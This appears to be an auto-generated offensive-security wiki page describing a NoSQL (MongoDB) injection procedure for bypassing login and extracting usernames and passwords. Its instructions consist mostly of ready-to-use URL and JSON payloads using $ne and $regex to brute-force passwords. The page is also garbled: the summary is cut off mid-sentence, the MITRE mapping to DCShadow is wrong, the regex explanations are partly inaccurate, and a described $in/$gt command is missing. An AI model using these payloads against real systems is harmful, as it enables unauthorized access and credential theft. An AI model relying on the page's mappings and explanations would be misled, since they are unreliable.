---
id: 712f42a0-db09-4a91-b042-89965db0c83f
name: 'NoSQL Injection: Extract User Data'
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:31.472588+00:00'
updated_at: '2023-04-10T20:23:02.389524+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[DCShadow|T1207 - DCShadow]]'
tags:
- '[[Exploit]]'
- '[[Extract data information]]'
- '[[NoSQL Injection]]'
commands:
- '[[JSON Password Regex Search]]'
- '[[URL Password Regex Search]]'
---

# NoSQL Injection: Extract User Data

## Summary

NoSQL databases are becoming more popular due to their scalability and flexibility. However, they are also vulnerable to injection attacks, just like traditional SQL databases. NoSQL injection attacks can be used to extract sensitive information from the database. In this procedure, we will use a M

## Description

# Description

NoSQL databases are becoming more popular due to their scalability and flexibility. However, they are also vulnerable to injection attacks, just like traditional SQL databases. NoSQL injection attacks can be used to extract sensitive information from the database. In this procedure, we will use a MongoDB query to extract user data, including usernames and passwords. This attack can be used to gain access to sensitive information and escalate privileges.

## Requirements

1. Access to a MongoDB database

1. Knowledge of the database schema

1. MongoDB client or tool

## Defense

1. Use input validation and sanitization techniques to prevent injection attacks

1. Implement access controls and limit privileges to prevent unauthorized access

1. Regularly monitor and log database activity to detect and respond to potential attacks

## Objectives

1. Extract usernames and passwords from a MongoDB database

1. Gain unauthorized access to sensitive information

# Instructions

1. To authenticate a user in MongoDB, use the following queries in the URL or JSON format:

**Code**: [[in URL
username[$ne]=toto&password[$regex]=m.{2}
u]]

> The above JSON object provides MongoDB queries for user authentication. The 'username' and 'password' fields are used to authenticate the user. The queries use the '$ne' operator to match all documents where the 'username' field does not equal 'toto'. The '$regex' operator is used to match all documents where the 'password' field matches a regular expression. The regular expression is defined as follows:

- m.{2}: matches any string that starts with 'm' and has a length of at least 3.
- md.{1}: matches any string that starts with 'md' and has a length of at least 4.
- mdp: matches the exact string 'mdp'.
- m.*: matches any string that starts with 'm'.
- md.*: matches any string that starts with 'md'.

These queries can be used in either URL or JSON format, depending on the requirements of the application. The JSON format uses the '$eq' operator to match the 'username' field exactly to 'admin', and the '$regex' operator to match the 'password' field to the regular expressions defined above.

**Command** ([[URL Password Regex Search]]):

```bash
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
```

**Command** ([[JSON Password Regex Search]]):

```bash
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

2. This command is used to extract user data from a database where the username matches any of the common usernames (Admin, 4dm1n, admin, root, administrator) and the password field is non-empty.

> The command uses the MongoDB query language to search for documents in a database. The $in operator is used to match documents where the username field matches any of the values in the provided array. The $gt operator is used to match documents where the password field is greater than an empty string. This command can be useful for identifying potential security vulnerabilities in a system where common usernames are used.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[DCShadow|T1207 - DCShadow]]

## Commands Used

- [[JSON Password Regex Search]]
- [[URL Password Regex Search]]

## Tags

- [[Exploit]]
- [[Extract data information]]
- [[NoSQL Injection]]
